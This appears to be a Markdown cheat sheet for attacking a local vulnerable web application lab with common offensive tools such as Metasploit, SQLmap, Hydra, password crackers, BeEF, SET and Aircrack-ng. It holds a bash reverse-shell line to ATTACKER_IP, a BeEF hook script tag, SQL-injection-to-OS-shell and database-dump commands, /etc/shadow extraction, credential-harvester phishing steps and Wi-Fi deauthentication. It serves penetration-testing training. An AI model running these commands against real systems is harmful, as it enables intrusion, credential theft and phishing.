# Security Tools Reference Guide

Quick reference for using each security tool with the vulnerable web application lab.

---

## 📊 Nmap - Network Scanner

### Basic Scans
```bash
# Service version detection
nmap -sV localhost

# Aggressive scan (OS detection, scripts, traceroute)
nmap -A -T4 localhost

# Scan all ports
nmap -p- localhost

# Scan specific ports
nmap -p 21,22,80,443,3306,5000,8080 localhost

# Vulnerability scripts
nmap --script=vuln localhost

# SMB enumeration
nmap --script=smb-enum-shares.nse,smb-enum-users.nse -p 445 localhost

# HTTP enumeration
nmap --script=http-enum -p 80,5000,8080 localhost
```

### NSE Scripts
```bash
# FTP anonymous login check
nmap --script=ftp-anon -p 21 localhost

# SSH weak algorithms
nmap --script=ssh2-enum-algos -p 2222 localhost

# MySQL info
nmap --script=mysql-info -p 3306 localhost

# HTTP methods
nmap --script=http-methods -p 5000 localhost
```

---

## 🔓 Metasploit Framework

### Starting
```bash
msfconsole
```

### FTP Exploits
```bash
# vsftpd 2.3.4 backdoor
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS localhost
set RPORT 21
exploit

# FTP anonymous login
use auxiliary/scanner/ftp/ftp_anonymous
set RHOSTS localhost
run
```

### SSH Exploits
```bash
# SSH login scanner
use auxiliary/scanner/ssh/ssh_login
set RHOSTS localhost
set RPORT 2222
set USERNAME sshuser
set PASSWORD sshpass123
run

# SSH version scan
use auxiliary/scanner/ssh/ssh_version
set RHOSTS localhost
set RPORT 2222
run
```

### MySQL Exploits
```bash
# MySQL login scanner
use auxiliary/scanner/mysql/mysql_login
set RHOSTS localhost
set RPORT 3306
set USERNAME vulnuser
set PASSWORD vulnpass
run

# MySQL enumeration
use auxiliary/scanner/mysql/mysql_enum
set RHOSTS localhost
set RPORT 3306
run
```

### HTTP Exploits
```bash
# HTTP version scan
use auxiliary/scanner/http/http_version
set RHOSTS localhost
set RPORT 5000
run

# Directory scanner
use auxiliary/scanner/http/dir_scanner
set RHOSTS localhost
set RPORT 5000
run
```

### SMB Exploits
```bash
# SMB version
use auxiliary/scanner/smb/smb_version
set RHOSTS localhost
set RPORT 445
run

# SMB shares
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS localhost
run
```

---

## 🛡️ Burp Suite

### Setup
1. Configure browser proxy: `127.0.0.1:8080`
2. Install Burp CA certificate
3. Enable Intercept

### Testing Targets
```
http://localhost:5000/login      - SQL Injection
http://localhost:5000/search     - Reflected XSS
http://localhost:5000/posts      - Stored XSS
http://localhost:5000/profile    - IDOR
http://localhost:5000/ping       - Command Injection
http://localhost:5000/upload     - File Upload
http://localhost:5000/fetch      - SSRF
http://localhost:5000/redirect   - Open Redirect
```

### Common Attacks
- **Intruder**: Brute force login
- **Repeater**: Manual request manipulation
- **Decoder**: Base64, URL encoding
- **Comparer**: Compare responses

---

## 🎥 Wireshark

### Capture Filters
```bash
# Capture HTTP traffic
tcp.port == 5000

# Capture MySQL traffic
tcp.port == 3306

# Capture FTP traffic
tcp.port == 21

# Capture SSH traffic
tcp.port == 2222

# Capture all traffic from host
host 172.20.0.2

# Capture DNS queries
udp.port == 53
```

### Display Filters
```bash
# HTTP requests
http.request.method == "POST"

# HTTP with credentials
http.authorization contains "Basic"

# MySQL queries
mysql.query contains "SELECT"

# TCP streams
tcp.stream eq 1

# Extract credentials
http.request.method == "POST" && http.request.uri == "/login"
```

---

## 🔍 Nikto - Web Scanner

### Basic Scan
```bash
nikto -h http://localhost:5000

# With authentication
nikto -h http://localhost:5000 -id admin:admin

# Scan specific ports
nikto -h localhost -p 5000,8080

# Evasion techniques
nikto -h http://localhost:5000 -evasion 1
```

### Output
```bash
# Save to file
nikto -h http://localhost:5000 -o report.html -Format html

# Verbose output
nikto -h http://localhost:5000 -v
```

---

## 📁 Gobuster - Directory Scanner

### Directory Enumeration
```bash
# Basic directory scan
gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt

# With file extensions
gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak

# Multi-threaded
gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt -t 50

# Verbose output
gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt -v
```

### DNS Enumeration
```bash
# Subdomain brute force
gobuster dns -u vulnapp.local -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1mil-5000.txt

# With resolver
gobuster dns -u vulnapp.local -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -r 8.8.8.8
```

### Vhost Enumeration
```bash
gobuster vhost -u http://localhost:5000 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1mil-5000.txt
```

---

## 💉 SQLmap - SQL Injection

### Basic Injection
```bash
# Test URL parameter
sqlmap -u "http://localhost:5000/messages?sender=admin"

# Test POST data
sqlmap -u "http://localhost:5000/login" --data="username=admin&password=test"

# With cookies
sqlmap -u "http://localhost:5000/messages?sender=admin" --cookie="PHPSESSID=abc123"
```

### Database Enumeration
```bash
# List databases
sqlmap -u "http://localhost:5000/messages?sender=admin" --dbs

# List tables
sqlmap -u "http://localhost:5000/messages?sender=admin" -D vulnapp --tables

# Dump table
sqlmap -u "http://localhost:5000/messages?sender=admin" -D vulnapp -T user --dump

# Dump all
sqlmap -u "http://localhost:5000/messages?sender=admin" --dump-all
```

### Advanced
```bash
# Get OS shell
sqlmap -u "http://localhost:5000/messages?sender=admin" --os-shell

# Get SQL shell
sqlmap -u "http://localhost:5000/messages?sender=admin" --sql-shell

# Bypass WAF
sqlmap -u "http://localhost:5000/messages?sender=admin" --tamper=space2comment

# Time-based blind
sqlmap -u "http://localhost:5000/messages?sender=admin" --technique=T
```

---

## 🔑 John the Ripper - Password Cracker

### Extract Hashes
```bash
# From MySQL
mysql -h localhost -u vulnuser -pvulnpass vulnapp -e "SELECT username, password FROM user;" > hashes.txt

# From /etc/passwd and /etc/shadow (requires root)
unshadow /etc/passwd /etc/shadow > unshadowed.txt
```

### Crack Hashes
```bash
# Auto-detect hash type
john hashes.txt

# Specify format (MD5)
john --format=raw-md5 hashes.txt

# Wordlist attack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Incremental attack
john --incremental hashes.txt

# Show cracked passwords
john --show hashes.txt
```

### Rules
```bash
# Use rules
john --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt

# Specific rule set
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=jumbo hashes.txt
```

---

## ⚡ Hashcat - GPU Password Cracker

### Hash Modes
```bash
# MD5 (-m 0)
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# SHA1 (-m 100)
hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt

# SHA256 (-m 1400)
hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt

# bcrypt (-m 3200)
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Attack Modes
```bash
# Dictionary attack
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Rule-based attack
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force (4 chars)
hashcat -m 0 hashes.txt -a 3 ?a?a?a?a

# Mask attack
hashcat -m 0 hashes.txt -a 3 ?u?l?l?l?d?d
```

### Show Results
```bash
hashcat -m 0 hashes.txt --show
```

---

## 🔓 Hydra - Brute Force

### SSH Brute Force
```bash
# Basic
hydra -l sshuser -P /usr/share/wordlists/rockyou.txt ssh://localhost:2222

# With verbose output
hydra -l sshuser -P /usr/share/wordlists/rockyou.txt ssh://localhost:2222 -V

# Multiple users
hydra -L users.txt -P passwords.txt ssh://localhost:2222
```

### FTP Brute Force
```bash
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://localhost
```

### HTTP Form Brute Force
```bash
# POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/login:username=^USER^&password=^PASS^:Login failed"

# GET form
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-get "/admin:user=^USER^&pass=^PASS^:H=Cookie: session=abc"
```

### MySQL Brute Force
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://localhost
```

### Options
```bash
# Parallel tasks
hydra -l admin -P passwords.txt -t 4 http://localhost http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# Resume session
hydra -R
```

---

## 🌐 Netcat

### Banner Grabbing
```bash
# FTP
nc localhost 21

# SSH
nc localhost 2222

# HTTP
nc localhost 5000
GET / HTTP/1.1
Host: localhost
```

### Port Scanning
```bash
# TCP scan
nc -zv localhost 1-1000

# Specific ports
nc -zv localhost 21 22 80 443 3306
```

### File Transfer
```bash
# Receiver
nc -lvnp 4444 > received_file.txt

# Sender
nc localhost 4444 < file_to_send.txt
```

### Reverse Shell
```bash
# Listener (attacker)
nc -lvnp 4444

# Target (run on vulnerable app)
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### Chat
```bash
# Server
nc -lvnp 9999

# Client
nc localhost 9999
```

---

## 🎯 Responder

### Basic Usage
```bash
# Start Responder
sudo responder -I eth0 -wrf

# Analyze mode
sudo responder -I eth0 -A

# Specific interface
sudo responder -I docker0 -wrf
```

### Options
```bash
# Disable HTTP server
sudo responder -I eth0 -wrf --no-http

# Disable SMB
sudo responder -I eth0 -wrf --no-smb

# WPAD
sudo responder -I eth0 -wrf --wpad
```

---

## 🐛 BeEF (Browser Exploitation Framework)

### Start BeEF
```bash
cd /path/to/beef
./beef
```

### Hook Browser
```html
<!-- Add to vulnerable page via XSS -->
<script src="http://YOUR_IP:3000/hook.js"></script>
```

### Commands
- **Browser**: Get browser info
- **Network**: Detect internal network
- **Social Engineering**: Phishing pages
- **Exploits**: Browser-specific exploits

---

## 🛠️ SET (Social-Engineer Toolkit)

### Start SET
```bash
setoolkit
```

### Attack Types
```
1) Social-Engineering Attacks
   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
      1) Java Applet Attack
      2) Credential Harvester
      3) Tabnabbing
   3) Infectious Media Generator
   4) Create a Payload and Listener
```

### Credential Harvester
```
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack
4) Site Cloner
   Enter URL to clone: http://localhost:5000
   Enter listener IP: YOUR_IP
```

---

## 📡 Aircrack-ng (WiFi)

### Monitor Mode
```bash
# Start monitor mode
airmon-ng start wlan0

# Stop monitor mode
airmon-ng stop wlan0mon
```

### Capture Handshake
```bash
# Scan networks
airodump-ng wlan0mon

# Target specific network
airodump-ng --bssid XX:XX:XX:XX:XX:XX -c 6 -w capture wlan0mon

# Deauth to get handshake
aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX:XX wlan0mon
```

### Crack Password
```bash
# Dictionary attack
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# BSSID filtering
aircrack-ng -b XX:XX:XX:XX:XX:XX -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

---

## 🔧 Quick Reference Card

| Tool | Port/Service | Example Command |
|------|--------------|-----------------|
| Nmap | All | `nmap -sV localhost` |
| Metasploit | FTP/SSH | `use exploit/unix/ftp/vsftpd_234_backdoor` |
| Burp Suite | HTTP | Proxy `127.0.0.1:8080` |
| Wireshark | All | Filter: `http` |
| Nikto | HTTP | `nikto -h http://localhost:5000` |
| Gobuster | HTTP | `gobuster dir -u http://localhost:5000 -w wordlist.txt` |
| SQLmap | HTTP | `sqlmap -u "http://localhost:5000/x?q=1" --dbs` |
| John | Hashes | `john --wordlist=rockyou.txt hashes.txt` |
| Hashcat | Hashes | `hashcat -m 0 hashes.txt rockyou.txt` |
| Hydra | SSH/FTP | `hydra -l user -P pass.txt ssh://localhost` |
| Netcat | All | `nc localhost 21` |
| Responder | Network | `sudo responder -I eth0 -wrf` |
| BeEF | HTTP | Hook: `<script src="http://IP:3000/hook.js">` |
| SET | HTTP | `setoolkit` |
| Aircrack-ng | WiFi | `aircrack-ng -w wordlist.txt capture.cap` |
